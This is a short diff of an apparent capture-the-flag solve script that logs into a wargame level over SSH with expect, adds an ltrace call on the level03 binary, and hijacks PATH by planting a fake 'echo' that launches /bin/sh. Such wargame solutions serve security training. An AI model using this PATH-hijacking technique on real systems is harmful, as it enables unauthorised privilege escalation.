@@ -10,6 +10,7 @@ spawn ssh "$level\@$ip" "-p $port"
 expect "password:" { send "$password\r" }
 
 expect -re {\$ $}
+	send "ltrace ./level03\r"
 	send "echo /bin/sh > /tmp/echo\r"
 	send "chmod +x /tmp/echo\r"
 	send "export PATH=/tmp:\$PATH\r"
